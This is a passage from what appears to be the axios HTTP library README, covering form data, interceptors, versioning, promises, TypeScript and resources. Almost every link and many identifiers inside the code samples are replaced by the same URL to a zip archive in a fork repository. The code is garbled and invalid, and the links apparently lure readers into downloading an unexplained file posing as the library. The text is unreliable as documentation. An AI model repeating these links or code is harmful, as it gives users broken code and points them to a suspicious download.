const params = new https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip({ foo: 'bar' });
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip', https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip());
```

You can also use the [`qs`](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) library.

###### NOTE
The `qs` library is preferable if you need to stringify nested objects, as the `querystring` method has known issues with that use case (https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip).

#### Form data

In https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip, you can use the [`form-data`](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) library as follows:

```js
const FormData = require('form-data');
 
const form = new FormData();
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('my_field', 'my value');
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('my_buffer', new Buffer(10));
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('my_file', https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip'));

https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip', form, { headers: https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip() })
```

Alternatively, use an interceptor:

```js
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(config => {
  if (https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip instanceof FormData) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip, https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip());
  }
  return config;
});
```

## Semver

Until axios reaches a `1.0` release, breaking changes will be released with a new minor version. For example `0.5.1`, and `0.5.4` will have the same API, but `0.6.0` will have breaking changes.

## Promises

axios depends on a native ES6 Promise implementation to be [supported](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip).
If your environment doesn't support ES6 Promises, you can [polyfill](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip).

## TypeScript
axios includes [TypeScript](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) definitions.
```typescript
import axios from 'axios';
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user?ID=12345');
```

## Resources

* [Changelog](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
* [Upgrade Guide](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
* [Ecosystem](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
* [Contributing Guide](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
* [Code of Conduct](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)

## Credits

axios is heavily inspired by the [$http service](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip$http) provided in [Angular](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip). Ultimately axios is an effort to provide a standalone `$http`-like service for use outside of Angular.

## License

[MIT](LICENSE)
